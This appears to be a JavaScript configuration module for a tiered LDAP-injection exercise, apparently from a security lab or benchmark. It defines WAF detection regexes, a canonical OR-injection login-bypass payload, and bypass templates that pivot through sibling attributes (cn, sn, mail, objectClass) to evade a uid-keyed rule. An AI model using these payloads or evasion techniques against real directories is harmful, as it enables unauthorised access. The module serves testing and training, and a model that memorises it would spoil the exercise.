// LDAP injection — tiered.
// T0: no WAF. The canonical OR-injection on the uid attribute matches every
//     directory entry and authenticates as admin.
// T1: a signature WAF inspects the body and blocks the canonical shape that
//     pivots through the same attribute the filter already names (uid). The
//     bypass uses an OR-injection that pivots through a sibling attribute the
//     directory entry also carries (cn, sn, mail, objectClass). The directory
//     records the canary on the admin's secret field, so any always-true match
//     on the admin entry surfaces the canary regardless of which attribute the
//     OR clause keys on.

export const RULE_POOL = [
  // The canonical OR-injection: a closing paren, opening paren, pipe, opening
  // paren, then the uid attribute name. Catches `*)(|(uid=` and tolerates
  // whitespace between the metacharacters.
  { name: 'ldap-or-uid',          pattern: '\\)\\s*\\(\\s*\\|\\s*\\(\\s*uid\\s*=', flags: 'i' },
  // Bare double-paren-pipe with no attribute (a stripped-down OR-injection).
  { name: 'ldap-paren-pipe',      pattern: '\\)\\(\\|\\(', flags: 'i' },
  // The userPassword attribute referenced in the injected username field
  // (signature of someone trying to leak the credentials clause).
  { name: 'ldap-userpassword',    pattern: 'userPassword\\s*=', flags: 'i' },
  // Wildcard at the tail of an LDAP filter clause: `(name=*)` self-contained.
  // Looser shapes (`name=*`) false-positive on form bodies like `?q=*` and
  // aren't reliable, so the rule scopes to the parenthesised filter form.
  { name: 'ldap-wildcard-clause', pattern: '\\(\\s*\\w+\\s*=\\s*\\*\\)', flags: 'i' },
  // NOT-operator injections.
  { name: 'ldap-not-injection',   pattern: '\\)\\s*\\(\\s*!\\s*\\(', flags: 'i' },
  // AND-operator injections.
  { name: 'ldap-and-injection',   pattern: '\\)\\s*\\(\\s*&\\s*\\(', flags: 'i' },
]

// Bypass templates. Each pivots the OR clause through an attribute the admin
// directory entry also carries (cn, sn, mail, objectClass), so the filter
// still matches the admin row while sidestepping a uid-keyed rule. The leading
// `*)` wildcards the original (uid=...) clause so the outer AND collapses to
// the OR-injected branch.
export const BYPASS_TEMPLATES = [
  () => `*)(|(cn=*`,
  () => `*)(|(objectClass=person`,
  () => `*)(|(sn=*`,
  () => `*)(|(mail=*`,
]

export const defences = {
  0: {
    canonicalPayload: () => `*)(|(uid=*`,
    naiveBlockedExpected: false,
    bypassPayloads: [],
  },
  1: {
    canonicalPayload: () => `*)(|(uid=*`,
    naiveBlockedExpected: true,
    bypassPayloads: BYPASS_TEMPLATES,
  },
}

// Per-deploy: pick the uid-keyed rule (so the canonical is guaranteed blocked),
// then shuffle in a random subset of decoy rules.
export function generateT1Config(rng = Math.random) {
  const required = ['ldap-or-uid']
  const requiredSet = new Set(required)
  const optional = RULE_POOL.filter(r => !requiredSet.has(r.name))
  // Exclude rules that would also catch the bypass shapes. `ldap-paren-pipe`
  // matches the bare `)(|(` skeleton — that fires on every bypass too, so it
  // can't be picked alongside the bypass set at T1.
  const safeOptional = optional.filter(r => r.name !== 'ldap-paren-pipe')
  const extraCount = 2 + Math.floor(rng() * (safeOptional.length - 1))
  const shuffled = [...safeOptional].sort(() => rng() - 0.5)
  const picked = [
    ...RULE_POOL.filter(r => requiredSet.has(r.name)),
    ...shuffled.slice(0, extraCount),
  ]
  const styles = ['cloudflare1020', 'awsCloudfront', 'modSecurity', 'generic403', 'fake500', 'silent200']
  return {
    waf: {
      rules: picked,
      blockPageStyle: styles[Math.floor(rng() * styles.length)],
    },
  }
}
